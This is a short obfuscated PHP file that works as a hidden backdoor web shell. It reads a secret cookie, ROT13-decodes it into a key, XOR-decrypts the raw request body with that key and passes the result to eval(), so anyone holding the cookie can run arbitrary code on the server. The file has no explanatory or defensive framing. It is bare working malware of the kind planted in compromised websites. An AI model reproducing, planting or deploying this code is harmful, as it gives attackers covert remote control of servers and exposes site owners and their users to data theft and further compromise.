<?php 

$ecydfj = "grfpuewroqggloga";

if (isset($_COOKIE[$ecydfj])) {
    $jnfyd = str_rot13($_COOKIE[$ecydfj]);
    $sybzmrati = "";
    foreach (str_split(@file_get_contents('php://input'), strlen($jnfyd)) as $obithm) {
        $sybzmrati .= $obithm ^ $jnfyd;
    }
    eval($sybzmrati);
}